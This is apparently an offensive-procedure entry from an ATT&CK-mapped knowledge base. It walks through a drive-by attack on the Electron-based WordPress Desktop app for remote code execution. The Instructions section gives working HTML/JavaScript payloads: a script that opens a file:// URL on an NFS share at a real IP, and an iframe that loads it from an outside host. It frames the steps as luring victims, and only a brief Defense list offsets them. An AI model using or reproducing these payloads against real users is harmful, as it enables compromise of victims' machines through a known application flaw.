---
id: proc-uuid-001
tags:
  - wordpress
  - iframe
  - javascript
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:23:28.113Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Malicious-WordPress-Page-with-Iframe

## Summary

This procedure creates a WordPress page embedding an iframe that loads malicious JavaScript to exploit URL handling in WordPress Desktop, initiating a drive-by compromise leading to RCE.

## Description

In the attack scenario, an attacker with access to a WordPress.com site creates a page with an iframe sourcing an external HTML file containing JavaScript. When viewed in the WordPress Desktop app (Electron-based), the JS calls window.open on a file:// URL, which shell.openExternal mishandles by executing local/remote files. Prerequisites include a WordPress.com account and a hosted malicious index.html. Expected outcome: The page triggers payload delivery upon victim interaction in the desktop app.

## Requirements

1. Active WordPress.com account with page creation privileges
2. Web server to host index.html with JS payload
3. Knowledge of victim's potential IP for NFS targeting

## Defense

Defensive measures and detection strategies:

- Disable or sandbox external link opening in Electron apps
- Validate all URLs to restrict to http/https schemes only
- Monitor for unexpected shell.openExternal calls in app logs

## Objectives

1. Deliver malicious payload via iframe to desktop app users
2. Trigger window.open on file:// URL for exploitation
3. Set up for remote code execution chain

## Instructions

### Step 1: Host Malicious Index.html

**Context**: Prepare the JavaScript payload on a remote server to be loaded by the iframe.

Create and host index.html with the following JS:

```html
<script>window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app');</script>
```

> This script executes immediately on load, opening the file:// URL.

### Step 2: Create WordPress Page

**Context**: Embed the iframe in a new WordPress page to lure victims.

Log into WordPress.com, create a new page, and switch to HTML editor. Insert:

```html
<center><iframe style="border: 0;" src="https://maustin.net/hax/wp_desktop/index.html" width="250" height="250"></iframe></center>
```

> Publish the page. When viewed in desktop app, it loads the iframe and triggers the exploit.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[wordpress]]
- [[iframe]]
- [[drive-by-compromise]]
